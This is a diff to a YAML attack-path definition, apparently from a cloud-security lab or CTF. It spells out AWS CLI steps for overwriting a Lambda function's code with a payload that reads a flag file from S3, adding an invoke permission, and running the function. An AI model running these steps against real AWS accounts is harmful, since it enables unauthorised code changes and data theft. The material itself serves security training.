@@ -73,15 +73,15 @@ attackMap:
         - description: "Get the current function details including handler name and execution role"
           command: "aws lambda get-function --function-name pl-prod-lambda-005-to-bucket-target-lambda --query '{Handler:Configuration.Handler,Role:Configuration.Role}'"
         - description: "Create malicious Python payload that reads the flag from S3"
-          command: "cat > /tmp/lambda_function.py << 'EOF'\nimport boto3\nimport json\n\ndef lambda_handler(event, context):\n    s3 = boto3.client('s3')\n    bucket = event.get('bucket')\n    obj = s3.get_object(Bucket=bucket, Key='flag.txt')\n    flag = obj['Body'].read().decode('utf-8')\n    return {'statusCode': 200, 'body': flag}\nEOF"
+          command: "TARGET_BUCKET=<paste the target_bucket_name output here>\ncat > /tmp/lambda_function.py << EOF\nimport boto3\nimport json\nimport os\n\ndef lambda_handler(event, context):\n    s3 = boto3.client('s3')\n    bucket = os.environ.get('TARGET_BUCKET', '${TARGET_BUCKET}')\n    obj = s3.get_object(Bucket=bucket, Key='flag.txt')\n    flag = obj['Body'].read().decode('utf-8')\n    return {'statusCode': 200, 'body': flag}\nEOF"
         - description: "Package the malicious code"
           command: "cd /tmp && zip malicious_lambda.zip lambda_function.py"
         - description: "Update the Lambda function with the malicious payload"
           command: "aws lambda update-function-code --function-name pl-prod-lambda-005-to-bucket-target-lambda --zip-file fileb:///tmp/malicious_lambda.zip"
         - description: "Grant self-invocation permission via resource-based policy"
           command: "ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text) && aws lambda add-permission --function-name pl-prod-lambda-005-to-bucket-target-lambda --statement-id allow-self-invoke --action lambda:InvokeFunction --principal arn:aws:iam::${ACCOUNT_ID}:user/pl-prod-lambda-005-to-bucket-starting-user"
-        - description: "Invoke the malicious Lambda and pass the target bucket name"
-          command: "TARGET_BUCKET=<target_bucket_name output from the player's Outputs tab> && aws lambda invoke --function-name pl-prod-lambda-005-to-bucket-target-lambda --payload \"{\\\"bucket\\\": \\\"${TARGET_BUCKET}\\\"}\" /tmp/lambda-response.json && cat /tmp/lambda-response.json"
+        - description: "Invoke the malicious Lambda with an empty payload"
+          command: "aws lambda invoke --function-name pl-prod-lambda-005-to-bucket-target-lambda --payload '{}' /tmp/lambda-response.json && cat /tmp/lambda-response.json"
 
     - from: target-lambda
       to: lambda-exec-role
